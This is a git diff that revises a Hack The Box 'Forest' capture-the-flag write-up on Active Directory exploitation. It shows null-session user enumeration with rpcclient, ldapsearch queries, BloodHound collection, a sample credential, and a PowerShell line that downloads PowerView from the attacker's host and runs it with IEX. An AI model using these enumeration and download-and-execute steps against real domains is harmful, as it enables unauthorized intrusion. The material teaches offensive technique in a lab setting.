@@ -8,6 +8,8 @@ tags:
   - pentest
   - writeup
   - bloodhound
+  - asreproast
+  - winrm
 ---
 
 ---
@@ -16,7 +18,7 @@ tags:
 
 The [Forest](https://app.hackthebox.com/machines/Forest) machine has been created by [egre55](https://app.hackthebox.com/users/1190) and [mrb3n](https://app.hackthebox.com/users/2984). This is an **easy** Windows Machine with a strong focus on Active Directory exploitation. Here, some knowledge about AD and being able to read a Bloodhound graph should be enough to clear the box.
 
-If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
+If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
 {: .text-justify}
 
 ![image-center](/images/htb/htb_forest_infocard.png){: .align-center}
@@ -33,6 +35,9 @@ This information can then be leveraged by an adversary to aid in other phases of
 ## Scan with Nmap
 
 Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.
+
+**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.
+{: .notice--info}
 
 ```bash
 $ nmap -sV 10.129.95.210 
@@ -57,18 +62,21 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 38.82 seconds
 ```
 
-**Remember:** By default, **Nmap** only target the 1000 most common ports. You can find the full list here: [https://github.com/nmap/nmap/blob/master/nmap-services](https://github.com/nmap/nmap/blob/master/nmap-services). However, they are sorted by port numbers, not by open frequency.
+**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
 {: .notice--warning}
 
-As we can see, the machine seems to be a domain controller for **htb.local**, we even have the hostname, **FOREST**. We also have a few interesting ports including 135/TCP (*MSRPC*), 389/TCP (*LDAP*) and 445/TCP (*SMB*). 
+As we can see, the machine seems to be a domain controller for **htb.local**. We also have a few interesting open services including **LDAP** (389/TCP) and **SMB** (445/TCP). 
 
 Now, we need more information, like usernames. With usernames, we would be able to go further and executes attacks like brute force, password spraying, etc.
 
 ## RPCBind
 
-Let's take a look at the **MSRPC** (*TPC/135*) port. According to this [Pentesting Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#rpc-netbios-smb), we could try to establish a **null session** using the [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) tool to enumerate some users.
+According to this [Pentesting Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#rpc-netbios-smb), we could try to establish a **null session** using the [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html). This tool provides a some intersing command to execute remote procedure calls, including a way to enumerate some users.
 
-As per the name, a null session does not require any username or password to get information about the remote host. So, let's prepare the **rpcclient** command with no username (`-U ""`), no password (`-N`) and a command to run in order to enumerate domain users (`-c enumdomusers`).
+**Note:** Microsoft Remote Procedure Call (MS-RPC) defines a powerful technology for creating distributed client/server programs. It is quite complex, but there are lots of [documentation](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) online if you want to dig a bit further.
+{: .notice--info}
+
+As per the name, a null session does not require any username or password to get information about the remote host. So, let's prepare the **rpcclient** command with no username (`-U ""`), no password (`-N`) and the command to run in order to enumerate domain users (`-c enumdomusers`).
 
 ```bash
 $ rpcclient -U "" -N -c enumdomusers 10.129.95.210 
@@ -105,15 +113,20 @@ user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
 ```
 
-It seems to be working. Note that, we have a few users starting with *HealthMailbox* and *SM_* which are related to [Microsoft Exchange](https://techcommunity.microsoft.com/t5/exchange-team-blog/exchange-2013-2016-monitoring-mailboxes/ba-p/611004) and can be ignored here.
+Nice, it seems to be working. Note that, we have a few users starting with *HealthMailbox* and *SM_* which are related to [Microsoft Exchange](https://techcommunity.microsoft.com/t5/exchange-team-blog/exchange-2013-2016-monitoring-mailboxes/ba-p/611004) and can be ignored here.
 
 Another way to enumerate users would be with [ldapsearch](https://linux.die.net/man/1/ldapsearch) and the LDAP (TCP/389) port.
 
 ```bash
-$ ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.129.95.210
+$ ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.129.110.245 | grep userPrincipalName
 
 ...[snip]...
 
+userPrincipalName: sebastien@htb.local
+userPrincipalName: santi@htb.local
+userPrincipalName: lucinda@htb.local
+userPrincipalName: andy@htb.local
+userPrincipalName: mark@htb.local
 ```
 
 `ldapsearch` is a really nice tool to open a connection to an LDAP server and performs targeted searches.
@@ -244,7 +257,7 @@ INFO: Done in 00M 09S
 INFO: Compressing output into 20220204141002_bloodhound.zip
 ```
 
-Now, you can import the generated file (*20220204141002_bloodhound.zip*) in BloodHound by running `sudo neo4j console`, then execute BloodHound in another terminal with the `bloodhound` command.
+Now, you can import the generated file (*20220204141002_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command.
 
 ## Getting Administrator Privileges
 
@@ -283,7 +296,7 @@ SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Stan
 SMB         10.129.95.210   445    FOREST           [+] htb.local\ax:Qwerty1! 
 ```
 
-Perfect ! Now, to abuse the DACL, we used a well-known PowerShell that aims to gain network situational awareness on Windows domains, [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1). Note that we used the local **Apache** service on Kali to host the file and download it from the remote machine.
+Perfect! Now, to abuse the DACL, we used a well-known PowerShell that aims to gain network situational awareness on Windows domains, [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1). Note that we used the local **Apache** service on Kali to host the file and download it from the remote machine.
 
 ```bash
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> (New-Object System.Net.WebClient).DownloadString('http://10.10.14.xx/PowerView.ps1') | IEX
@@ -332,4 +345,4 @@ SMB         10.129.95.210   445    FOREST           1 File(s)             34 byt
 SMB         10.129.95.210   445    FOREST           2 Dir(s)  10,443,857,920 bytes free
 ```
 
-Awesome ! I hope you enjoyed it, I know I did :)
+Awesome! I hope you enjoyed it, I know I did :)
